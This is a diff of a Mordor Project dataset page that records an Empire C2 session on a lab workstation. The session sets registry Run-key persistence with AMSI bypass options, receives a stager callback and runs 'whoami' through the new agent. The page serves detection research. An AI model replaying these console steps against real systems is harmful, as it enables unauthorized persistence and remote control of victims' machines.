@@ -5,7 +5,7 @@
 <html xmlns="http://www.w3.org/1999/xhtml">
   <head>
     <meta charset="utf-8" />
-    <title>Empire Userland Registry &#8212; The Mordor Project</title>
+    <title>Empire Userland Registry Run Key &#8212; The Mordor Project</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.2/css/all.min.css" integrity="sha384-KA6wR/X5RY4zFAHpv/CnoG2UW1uogYfdnP67Uv7eULvTveboZJg0qUpmJZb5VqzN" crossorigin="anonymous">
     <link href="../../../../_static/css/index.css" rel="stylesheet">
     <link rel="stylesheet" href="../../../../_static/sphinx-book-theme.css" type="text/css" />
@@ -50,8 +50,8 @@
 <!-- Opengraph tags -->
 <meta property="og:url"         content="https://mordordatasets.com/notebooks/small/windows/03_persistence/SDWIN-190319023812.html" />
 <meta property="og:type"        content="article" />
-<meta property="og:title"       content="Empire Userland Registry" />
-<meta property="og:description" content="Empire Userland Registry  Metadata          id  SDWIN-190319023812  author  Roberto Rodriguez @Cyb3rWard0g  creation date  2019/03/19  platform  Windows  Mordor" />
+<meta property="og:title"       content="Empire Userland Registry Run Key" />
+<meta property="og:description" content="Empire Userland Registry Run Key  Metadata          id  SDWIN-190319023812  author  Roberto Rodriguez @Cyb3rWard0g  creation date  2019/03/19  platform  Windows" />
 <meta property="og:image"       content="https://mordordatasets.com/_static/logo.png" />
 
 <meta name="twitter:card" content="summary" />
@@ -209,7 +209,7 @@
     <ul class="current">
      <li class="toctree-l3 current active">
       <a class="current reference internal" href="#">
-       Empire Userland Registry
+       Empire Userland Registry Run Key
       </a>
      </li>
      <li class="toctree-l3">
@@ -244,6 +244,11 @@
      Privilege Escalation
     </a>
     <ul>
+     <li class="toctree-l3">
+      <a class="reference internal" href="../04_privilege_escalation/SDWIN-200904032946.html">
+       Empire UAC Shell API FodHelper
+      </a>
+     </li>
      <li class="toctree-l3">
       <a class="reference internal" href="../04_privilege_escalation/SDWIN-190518204300.html">
        Empire Invoke Runas
@@ -759,8 +764,8 @@
         
               <div>
                 
-  <div class="section" id="empire-userland-registry">
-<h1>Empire Userland Registry<a class="headerlink" href="#empire-userland-registry" title="Permalink to this headline">¶</a></h1>
+  <div class="section" id="empire-userland-registry-run-key">
+<h1>Empire Userland Registry Run Key<a class="headerlink" href="#empire-userland-registry-run-key" title="Permalink to this headline">¶</a></h1>
 <div class="section" id="metadata">
 <h2>Metadata<a class="headerlink" href="#metadata" title="Permalink to this headline">¶</a></h2>
 <table class="colwidths-auto table">
@@ -795,7 +800,7 @@
 <td class="text-align:left"><p>https://github.com/EmpireProject/Empire/blob/dev/data/module_source/persistence/Persistence.psm1</p></td>
 </tr>
 <tr class="row-even"><td class="text-align:left"><p>Dataset</p></td>
-<td class="text-align:left"><p>https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/persistence/empire_userland_registry.tar.gz</p></td>
+<td class="text-align:left"><p>https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/persistence/empire_userland_registry_run_key.zip</p></td>
 </tr>
 <tr class="row-odd"><td class="text-align:left"><p>References</p></td>
 <td class="text-align:left"><p>None</p></td>
@@ -805,11 +810,28 @@
 </div>
 <div class="section" id="dataset-description">
 <h2>Dataset Description<a class="headerlink" href="#dataset-description" title="Permalink to this headline">¶</a></h2>
-<p>This dataset represents adversaries modifying HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\Run registry keys for persistence.</p>
+<p>This dataset represents adversaries modifying HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\Run registry keys for persistence. It also captures the execution of the persistence mechanism.</p>
 </div>
 <div class="section" id="adversary-view">
 <h2>Adversary View<a class="headerlink" href="#adversary-view" title="Permalink to this headline">¶</a></h2>
-<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>usemodule persistence/userland/registry
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>(Empire: stager/multi/launcher) &gt; 
+(Empire: stager/multi/launcher) &gt; agents
+
+[*] Active agents:
+
+Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener
+----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------
+KU86XWEL ps 172.18.39.5     WORKSTATION5      THESHIRE\pgustavo       powershell         5376   5/0.0    2020-09-04 07:02:57  http            
+
+(Empire: agents) &gt; interact KU86XWEL
+(Empire: KU86XWEL) &gt; 
+(Empire: KU86XWEL) &gt; usemodule persistence/
+elevated/registry*                 misc/add_netuser                   misc/install_ssp*                  powerbreach/resolver
+elevated/rid_hijack*               misc/add_sid_history*              misc/memssp*                       userland/backdoor_lnk
+elevated/schtasks*                 misc/debugger*                     misc/skeleton_key*                 userland/registry
+elevated/wmi*                      misc/disable_machine_acct_change*  powerbreach/deaduser               userland/schtasks
+elevated/wmi_updater*              misc/get_ssps                      powerbreach/eventlog*              
+(Empire: KU86XWEL) &gt; usemodule persistence/userland/registry
 (Empire: powershell/persistence/userland/registry) &gt; info
 
               Name: Invoke-Registry
@@ -837,92 +859,76 @@ Comments:
 
 Options:
 
-  Name       Required    Value                     Description
-  ----       --------    -------                   -----------
-  ProxyCreds False       default                   Proxy credentials                       
-                                                  ([domain\]username:password) to use for 
-                                                  request (default, none, or other).      
-  EventLogID False                                 Store the script in the Application     
-                                                  event log under the specified EventID.  
-                                                  The ID needs to be unique/rare!         
-  ExtFile    False                                 Use an external file for the payload    
-                                                  instead of a stager.                    
-  Cleanup    False                                 Switch. Cleanup the trigger and any     
-                                                  script from specified location.         
-  ADSPath    False                                 Alternate-data-stream location to store 
-                                                  the script code.                        
-  Agent      True        FD6A3MGY                  Agent to run module on.                 
-  Listener   True                                  Listener to use.                        
-  KeyName    True        Updater                   Key name for the run trigger.           
-  RegPath    False       HKCU:Software\Microsoft\  Registry location to store the script   
-                        Windows\CurrentVersion\D  code. Last element is the key name.     
-                        ebug                    
-  Proxy      False       default                   Proxy to use for request (default, none,
-                                                  or other).                              
-  UserAgent  False       default                   User-agent string to use for the staging
-                                                  request (default, none, or other).      
+  Name             Required    Value                     Description
+  ----             --------    -------                   -----------
+  Agent            True        KU86XWEL                  Agent to run module on.                 
+  Listener         False                                 Listener to use.                        
+  Obfuscate        False       False                     Switch. Obfuscate the launcher          
+                                                        powershell code, uses the               
+                                                        ObfuscateCommand for obfuscation types. 
+                                                        For powershell only.                    
+  ObfuscateCommand False       Token\All\1               The Invoke-Obfuscation command to use.  
+                                                        Only used if Obfuscate switch is True.  
+                                                        For powershell only.                    
+  AMSIBypass       False       True                      Include mattifestation&#39;s AMSI Bypass in 
+                                                        the stager code.                        
+  AMSIBypass2      False       False                     Include Tal Liberman&#39;s AMSI Bypass in   
+                                                        the stager code.                        
+  KeyName          True        Updater                   Key name for the run trigger.           
+  RegPath          False       HKCU:Software\Microsoft\  Registry location to store the script   
+                              Windows\CurrentVersion\D  code. Last element is the key name.     
+                              ebug                    
+  ADSPath          False                                 Alternate-data-stream location to store 
+                                                        the script code.                        
+  EventLogID       False                                 Store the script in the Application     
+                                                        event log under the specified EventID.  
+                                                        The ID needs to be unique/rare!         
+  ExtFile          False                                 Use an external file for the payload    
+                                                        instead of a stager.                    
+  Cleanup          False                                 Switch. Cleanup the trigger and any     
+                                                        script from specified location.         
+  UserAgent        False       default                   User-agent string to use for the staging
+                                                        request (default, none, or other).      
+  Proxy            False       default                   Proxy to use for request (default, none,
+                                                        or other).                              
+  ProxyCreds       False       default                   Proxy credentials                       
+                                                        ([domain\]username:password) to use for 
+                                                        request (default, none, or other).      
 
-(Empire: powershell/persistence/userland/registry) &gt; set Listener https
-(Empire: powershell/persistence/userland/registry) &gt; info
-
-              Name: Invoke-Registry
-            Module: powershell/persistence/userland/registry
-        NeedsAdmin: False
-        OpsecSafe: False
-          Language: powershell
-MinLanguageVersion: 2
-        Background: False
-  OutputExtension: None
-
-Authors:
-  @mattifestation
-  @harmj0y
-  @enigma0x3
-
-Description:
-  Persist a stager (or script) via the
-  HKCU:SOFTWARE\Microsoft\Windows\CurrentVersion\Run registry
-  key. This has an easy detection/removal rating.
-
-Comments:
-  https://github.com/mattifestation/PowerSploit/blob/master/Pe
-  rsistence/Persistence.psm1
-
-Options:
-
-  Name       Required    Value                     Description
-  ----       --------    -------                   -----------
-  ProxyCreds False       default                   Proxy credentials                       
-                                                  ([domain\]username:password) to use for 
-                                                  request (default, none, or other).      
-  EventLogID False                                 Store the script in the Application     
-                                                  event log under the specified EventID.  
-                                                  The ID needs to be unique/rare!         
-  ExtFile    False                                 Use an external file for the payload    
-                                                  instead of a stager.                    
-  Cleanup    False                                 Switch. Cleanup the trigger and any     
-                                                  script from specified location.         
-  ADSPath    False                                 Alternate-data-stream location to store 
-                                                  the script code.                        
-  Agent      True        FD6A3MGY                  Agent to run module on.                 
-  Listener   True        https                     Listener to use.                        
-  KeyName    True        Updater                   Key name for the run trigger.           
-  RegPath    False       HKCU:Software\Microsoft\  Registry location to store the script   
-                        Windows\CurrentVersion\D  code. Last element is the key name.     
-                        ebug                    
-  Proxy      False       default                   Proxy to use for request (default, none,
-                                                  or other).                              
-  UserAgent  False       default                   User-agent string to use for the staging
-                                                  request (default, none, or other).      
-
+(Empire: powershell/persistence/userland/registry) &gt; set Listener http
 (Empire: powershell/persistence/userland/registry) &gt; execute
 [&gt;] Module is not opsec safe, run? [y/N] y
-[*] Tasked FD6A3MGY to run TASK_CMD_WAIT
-[*] Agent FD6A3MGY tasked with task ID 9
-[*] Tasked agent FD6A3MGY to run module powershell/persistence/userland/registry
-(Empire: powershell/persistence/userland/registry) &gt; Registry persistence established using listener https stored in HKCU:Software\Microsoft\Windows\CurrentVersion\Debug.
+[*] Tasked KU86XWEL to run TASK_CMD_WAIT
+[*] Agent KU86XWEL tasked with task ID 1
+[*] Tasked agent KU86XWEL to run module powershell/persistence/userland/registry
+(Empire: powershell/persistence/userland/registry) &gt; 
+Registry persistence established using listener http stored in HKCU:Software\Microsoft\Windows\CurrentVersion\Debug.
 
-(Empire: powershell/persistence/userland/registry) &gt;
+(Empire: powershell/persistence/userland/registry) &gt; 
+(Empire: powershell/persistence/userland/registry) &gt; 
+[*] Sending POWERSHELL stager (stage 1) to 172.18.39.5
+[*] New agent SP7B3U2X checked in
+[+] Initial agent SP7B3U2X from 172.18.39.5 now active (Slack)
+[*] Sending agent (stage 2) to SP7B3U2X at 172.18.39.5
+
+(Empire: powershell/persistence/userland/registry) &gt; agents
+
+[*] Active agents:
+
+Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener
+----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------
+KU86XWEL ps 172.18.39.5     WORKSTATION5      THESHIRE\pgustavo       powershell         5376   5/0.0    2020-09-04 07:07:17  http            
+SP7B3U2X ps 172.18.39.5     WORKSTATION5      THESHIRE\pgustavo       powershell         1376   5/0.0    2020-09-04 07:09:04  http            
+
+(Empire: agents) &gt; interact SP7B3U2X
+(Empire: SP7B3U2X) &gt; shell whoami
+[*] Tasked SP7B3U2X to run TASK_SHELL
+[*] Agent SP7B3U2X tasked with task ID 1
+(Empire: SP7B3U2X) &gt; 
+theshire\pgustavo
+..Command execution completed.
+
+(Empire: SP7B3U2X) &gt;
 </pre></div>
 </div>
 </div>
@@ -943,7 +949,7 @@ Options:
 <h3>Download &amp; Process Mordor File<a class="headerlink" href="#download-process-mordor-file" title="Permalink to this headline">¶</a></h3>
 <div class="cell docutils container">
 <div class="cell_input docutils container">
-<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">mordor_file</span> <span class="o">=</span> <span class="s2">&quot;https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/persistence/empire_userland_registry.tar.gz&quot;</span>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">mordor_file</span> <span class="o">=</span> <span class="s2">&quot;https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/persistence/empire_userland_registry_run_key.zip&quot;</span>
 <span class="n">registerMordorSQLTable</span><span class="p">(</span><span class="n">spark</span><span class="p">,</span> <span class="n">mordor_file</span><span class="p">,</span> <span class="s2">&quot;mordorTable&quot;</span><span class="p">)</span>
 </pre></div>
 </div>
